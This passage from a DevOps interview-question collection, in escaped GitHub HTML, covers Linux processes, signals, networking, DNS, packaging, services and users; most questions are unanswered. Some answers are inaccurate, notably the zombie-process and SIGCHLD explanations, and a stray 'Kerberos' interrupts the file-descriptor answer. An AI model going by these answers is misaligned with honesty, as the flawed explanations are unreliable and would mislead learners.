&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is tmpfs?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Fix the following commands:
&lt;ul&gt;
&lt;li&gt;sed "s/1/2/g' /tmp/myFile&lt;/li&gt;
&lt;li&gt;find . -iname *.yaml -exec sed -i "s/1/2/g" {} ;&lt;/li&gt;
&lt;/ul&gt;
  &lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;
&lt;code&gt;sed 's/1/2/g' /tmp/myFile&lt;/code&gt;&lt;br&gt;
&lt;code&gt; find . -iname "*.yaml" -exec sed -i "s/1/2/g" {} \; &lt;/code&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is stored in each of the following paths and if there is anything unique about it:&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;/tmp&lt;/li&gt;
&lt;li&gt;/var/log&lt;/li&gt;
&lt;li&gt;/bin&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;/usr/local
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;h4&gt;&lt;a id="user-content-processes" class="anchor" aria-hidden="true" href="#processes"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Processes&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;How to run a process in the background and why to do that in the first place?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;You can achieve that by specifying &amp;amp; at end of the command.
As to why, since some commands/processes can take a lot of time to finish
execution or run forever
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How can you find how much memory a specific process consumes?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What signal is used by default when you run 'kill *process id*'?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;The default signal is SIGTERM (15). This signal kills
process gracefully which means it allows it to save current
state configuration.
&lt;/pre&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What signals are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;SIGTERM - default signal for terminating a process
SIGHUP - common usage is for reloading configuration
SIGKILL - a signal which cannot caught or ignored&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;To view all available signals run &lt;code&gt;kill -l&lt;/code&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What &lt;code&gt;kill 0&lt;/code&gt; does?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What &lt;code&gt;kill -0 &lt;/code&gt; does?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a trap?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What happens when you press ctrl + c?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are daemons?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are the possible states of a process in Linux?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;Running (R)
Uninterruptible Sleep (D) - The process is waiting for I/O
Interruptible Sleep (S)
Stopped (T)
Dead (x)
Zombie (z)
&lt;/pre&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a zombie process?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;A process which has finished to run but has not exited.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;One reason it happens is when a parent process is programmed incorrectly. Every parent process should execute wait() to get the exit code from the child process which finished to run. But when the parent isn't checking for the child exit code, the child process can still exists although it finished to run.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to get rid of zombie processes?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;You can't kill a zombie process the regular way with &lt;code&gt;kill -9&lt;/code&gt; for example as it's already dead.&lt;/p&gt;
&lt;p&gt;One way to kill zombie process is by sending SIGCHLD to the parent process telling it to terminate its child processes. This might not work if the parent process wasn't programmed properly. The invocation is &lt;code&gt;kill -s SIGCHLD [parent_pid]&lt;/code&gt;&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;You can also try closing/terminating the parent process. This will make the zombie process a child of init (1) which does periodic cleanups and will at some point clean up the zombie process.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to find all the
&lt;ul&gt;
&lt;li&gt;Processes executed/owned by a certain user&lt;/li&gt;
&lt;li&gt;Process which are Java processes&lt;/li&gt;
&lt;li&gt;Zombie Processes&lt;/li&gt;
&lt;/ul&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;If you mention at any point ps command with arugments, be familiar with what these arguments does exactly.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is the init process?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to change the priority of a process? Why would you want to do that?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Can you explain how network process/connection is established and how it's terminated?&amp;gt;&lt;/summary&gt;&lt;br&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are system calls? What system calls are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What &lt;code&gt;strace&lt;/code&gt; does? What about &lt;code&gt;ltrace&lt;/code&gt;?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Find all the files which end with '.yml' and replace the number 1 in 2 in each file&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;find /some_dir -iname *.yml -print0 | xargs -0 -r sed -i "s/1/2/g"
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to check how much free memory a system has? How to check memory consumption by each process?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;You can use the commands &lt;code&gt;top&lt;/code&gt; and &lt;code&gt;free&lt;/code&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;You run ls and you get "/lib/ld-linux-armhf.so.3 no such file or directory". What is the problem?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;The ls executable is built for an incompatible architecture.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How would you split a 50 lines file into 2 files of 25 lines each?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;You can use the &lt;code&gt;split&lt;/code&gt; command this way: &lt;code&gt;split -l 25 some_file&lt;/code&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is a file descriptor? What file descriptors are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
Kerberos
File descriptor, also known as file handler, is a unique number which identifies an open file in the operating system.
&lt;p&gt;In Linux (and Unix) the first three file descriptors are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;0 - the default data stream for input&lt;/li&gt;
&lt;li&gt;1 - the default data stream for output&lt;/li&gt;
&lt;li&gt;2 - the default data stream for output related to errors&lt;/li&gt;
&lt;/ul&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;This is a great article on the topic: &lt;a href="https://www.computerhope.com/jargon/f/file-descriptor.htm" rel="nofollow"&gt;https://www.computerhope.com/jargon/f/file-descriptor.htm&lt;/a&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is NTP? What is it used for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Kernel OOM&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h5&gt;&lt;a id="user-content-linux-security" class="anchor" aria-hidden="true" href="#linux-security"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Linux Security&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What is chroot? In what scenarios would you consider using it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is SELiunx?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is Kerberos?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is nftables?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What firewalld daemon is responsible for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Do you have experience with hardening servers? Can you describe the process?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h5&gt;&lt;a id="user-content-network-1" class="anchor" aria-hidden="true" href="#network-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Network&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What is a network namespace? What is it used for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to check if a certain port is being used?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;One of the following would work:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;netstat -tnlp | grep &amp;lt;port_number&amp;gt;
lsof -i -n -P | grep &amp;lt;port_number&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How can you turn your Linux server into a router?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a virtual IP? In what situation would you use it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Can you have more than one default gateway in a given system?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Technically, yes.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Which port is used in each of the following protocols?:
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;SSH&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HTTP&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DNS&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HTTPS&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;&lt;p&gt;&lt;/p&gt;

&lt;li&gt;
&lt;p&gt;SSH - 22&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HTTP - 80&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DNS - 53&lt;/p&gt;
&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;HTTPS - 443
&lt;/b&gt;&lt;/p&gt;&lt;/li&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;


&lt;details&gt;
&lt;summary&gt;What is the routing table? How do you view it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How can you send an HTTP request from your shell?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Using nc is one way
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What are packet sniffers? Have you used one in the past? If yes, which packet sniffers have you used and for what purpose?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to list active connections?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to trigger neighbor discovery in IPv6?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;One way would be &lt;code&gt;ping6 ff02::1&lt;/code&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-linux-dns" class="anchor" aria-hidden="true" href="#linux-dns"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Linux DNS&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What the file &lt;code&gt;/etc/resolv.conf&lt;/code&gt; is used for? What does it include?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What commands are you using for performing DNS queries (or troubleshoot DNS related issues)?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;You can specify one or more of the following:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;&lt;code&gt;dig&lt;/code&gt;&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;&lt;code&gt;nslookup&lt;/code&gt;
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;h5&gt;&lt;a id="user-content-packaging" class="anchor" aria-hidden="true" href="#packaging"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Packaging&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;Do you have experience with packaging? Can you explain how it works?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;RPM: explain the spec format(what it should and can include)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you list the content of a package without actually installing it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to know to which package a file on the system belongs to? Is it a problem if it doesn't belongs to a package?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h5&gt;&lt;a id="user-content-applications-and-services" class="anchor" aria-hidden="true" href="#applications-and-services"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Applications and Services&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What can you find in /etc/services?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to make sure a Service starts automatically after a reboot or crash?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Depends on the init system.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Systemd: &lt;code&gt; systemctl enable [service_name] &lt;/code&gt;
System V: &lt;code&gt; update-rc.d [service_name] &lt;/code&gt; and add this line &lt;code&gt; id:5678:respawn:/bin/sh /path/to/app &lt;/code&gt; to /etc/inittab
Upstart: add Upstart init script at /etc/init/service.conf
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;You run &lt;code&gt;ssh 127.0.0.1&lt;/code&gt; but it fails with "connection refused". What could be the problem?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ol&gt;&lt;b&gt;
&lt;li&gt;SSH server is not installed&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;SSH server is not running
&lt;/b&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;How to print the shared libraries required by a certain program? What is it useful for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h5&gt;&lt;a id="user-content-users" class="anchor" aria-hidden="true" href="#users"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Users&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;How do you create users? Where user information is stored?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Do you know how to create a new user without using adduser/useradd command?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What information is stored in /etc/passwd?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to add a new user to the system without providing him the ability to log-in into the system?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;adduser user_name --shell=/bin/false --no-create-home
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What can you do if you lost/forogt the root password?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Re-install the OS IS NOT the right answer :)
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is sudo? How do you set it up?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-random-and-perhaps-useless-" class="anchor" aria-hidden="true" href="#random-and-perhaps-useless-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Random and perhaps useless :)&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Give 5 commands which are two letters long&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;ls, wc, dd, df, du, ps, ip, cp, cd ...
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What a double dash (--) mean?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;It's used in commands to mark the end of commands options. One common example is when used with git to discard local changes: &lt;code&gt;git checkout -- some_file&lt;/code&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-commands" class="anchor" aria-hidden="true" href="#commands"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Commands&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What the &lt;code&gt;lsof&lt;/code&gt; command does? Have you used it? What for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What the &lt;code&gt;awk&lt;/code&gt; command does? Have you used it? What for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;p&gt;&lt;a name="user-content-linux-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-star-advanced-3" class="anchor" aria-hidden="true" href="#star-advanced-3"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt; Advanced&lt;/h4&gt;
